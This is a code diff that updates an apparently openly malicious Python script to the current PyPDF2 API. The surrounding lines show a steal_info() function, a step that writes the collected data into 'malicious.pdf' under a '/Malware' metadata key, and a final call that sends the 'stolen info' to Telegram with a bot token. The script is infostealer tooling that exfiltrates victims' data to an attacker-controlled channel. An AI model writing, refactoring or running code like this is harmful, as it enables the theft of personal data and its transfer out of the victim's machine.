@@ -23,22 +23,20 @@ def steal_info():
 
 # Function to add malware to a PDF file
 def add_malware_to_pdf(malware, pdf):
-    file = open(pdf, 'rb')
-    pdf_reader = PyPDF2.PdfFileReader(file)
-    pdf_writer = PyPDF2.PdfFileWriter()
-    
-    # Copy existing pages into the new PDF
-    for page in range(pdf_reader.getNumPages()):
-        pdf_writer.addPage(pdf_reader.getPage(page))
-    
-    # Add malware as metadata (example only)
-    pdf_writer.addMetadata({'/Malware': malware})
-    
-    # Save the new malicious PDF
-    stream = open('malicious.pdf', 'wb')
-    pdf_writer.write(stream)
-    stream.close()
-    file.close()
+    with open(pdf, 'rb') as file:
+        pdf_reader = PyPDF2.PdfReader(file)
+        pdf_writer = PyPDF2.PdfWriter()
+        
+        # Copy existing pages into the new PDF
+        for page in pdf_reader.pages:
+            pdf_writer.add_page(page)
+        
+        # Add malware as metadata (example only)
+        pdf_writer.add_metadata({'/Malware': malware})
+        
+        # Save the new malicious PDF
+        with open('malicious.pdf', 'wb') as stream:
+            pdf_writer.write(stream)
     print("Malicious PDF created: malicious.pdf")
 
 # Function to send data to Telegram
@@ -65,4 +63,4 @@ print(info)
 add_malware_to_pdf(info[0] + info[1], "hello.pdf")
 
 # Step 4: Send stolen info to Telegram
-send_to_telegram(telegram_token, chat_id, info)
+send_to_telegram(telegram_token, chat_id, info) 
